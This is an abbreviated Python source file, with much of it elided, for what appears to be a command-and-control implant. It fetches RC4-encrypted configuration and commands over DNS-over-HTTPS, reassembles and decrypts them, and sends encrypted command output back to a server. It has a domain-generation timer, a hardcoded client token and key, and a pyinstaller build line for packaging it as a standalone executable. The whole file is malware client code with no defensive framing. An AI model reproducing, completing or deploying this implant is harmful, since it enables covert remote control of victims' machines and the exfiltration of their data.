# pyinstaller --onefile DOH_RC4.py
...
class DOH_Client:
    def __init__(self, server_url, id_token, rc4_key, user_agent=None, uris=None, dga_timer=300):
        self.server_url = server_url.rstrip("/")
        self.id_token = id_token.strip().lower()
        self.rc4_cipher = RC4(rc4_key)
    ...
    def parse_init_payload(self, txt):
        try:
            if txt.startswith("ENC:"):
                ...
                decrypted_bytes = self.rc4_cipher.crypt(encrypted_bytes)
    ...
    def parse_config_part(self, txt):
        try:
            ...
            if cfg_data['received_count'] == cfg_data['total']:
                ...
                encrypted_bytes = b64decode(full_encoded)
                decrypted_bytes = self.rc4_cipher.crypt(encrypted_bytes)
                decrypted_config = decrypted_bytes.decode('utf-8')
                calculated = hashlib.sha256(encrypted_bytes).hexdigest()[:8]
            ...
            if checksum in self.command_parts:
                ...
                if cmd_data['received_count'] == cmd_data['total']:
                    ...
                    try:
                        encrypted_bytes = b64decode(full_encoded)
                        decrypted_bytes = self.rc4_cipher.crypt(encrypted_bytes)
                        full_command = decrypted_bytes.decode('utf-8')
    ...
    def send_output(self, output):
        ...
        try:
            encrypted_bytes = self.rc4_cipher.crypt(output.encode('utf-8'))
            encrypted_output = b64encode(encrypted_bytes).decode('utf-8')
...
if __name__ == "__main__":
    ...
    id_token = "d42b0668-1a09-4992-9f38-1e6225dd0328"
    rc4_key = "11"
    
    client = DOH_Client(server_url, id_token, rc4_key, dga_timer=5)
    client.run()
